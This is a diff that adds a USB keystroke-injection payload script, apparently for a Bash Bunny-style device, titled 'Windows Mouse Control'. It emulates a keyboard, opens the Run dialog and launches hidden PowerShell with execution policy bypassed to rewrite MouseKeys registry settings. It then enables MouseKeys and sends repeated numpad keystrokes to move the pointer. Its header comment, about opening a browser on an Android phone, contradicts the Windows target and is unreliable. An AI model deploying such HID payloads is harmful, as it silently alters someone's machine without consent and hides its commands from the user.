@@ -1,0 +1,47 @@
+#!/bin/bash
+#
+# Title:         Windows Mouse Control
+# Author:        bg-wa
+# Version:       1.0
+# Target:        Windows
+#
+# Opens the browser to a specified url on an unlocked android phone.
+#
+
+LED B
+
+ATTACKMODE HID
+
+Q DELAY 500
+Q GUI r
+Q DELAY 100
+Q STRING powershell -WindowStyle Hidden -Exec Bypass "Set-ItemProperty -Path 'HKCU:\Control Panel\Accessibility\MouseKeys' -Name 'Flags' -Value 38 -ErrorAction SilentlyContinue"
+Q DELAY 100
+Q ENTER
+
+Q DELAY 500
+Q GUI r
+Q DELAY 100
+Q STRING powershell -WindowStyle Hidden -Exec Bypass "Set-ItemProperty -Path 'HKCU:\Control Panel\Accessibility\MouseKeys' -Name 'MaximumSpeed' -Value 358 -ErrorAction SilentlyContinue"
+Q DELAY 100
+Q ENTER
+
+Q DELAY 500
+Q GUI r
+Q DELAY 100
+Q STRING powershell -WindowStyle Hidden -Exec Bypass "Set-ItemProperty -Path 'HKCU:\Control Panel\Accessibility\MouseKeys' -Name 'TimeToMaximumSpeed' -Value 1000 -ErrorAction SilentlyContinue"
+Q DELAY 100
+Q ENTER
+LED G 100
+Q DELAY 1000
+
+Q ALT SHIFT NUMLOCK
+Q DELAY 1000
+
+LED G
+
+#USE NUMPAD TO MOVE MOUSE
+for i in {1..100}
+do
+   Q STRING 8
+done
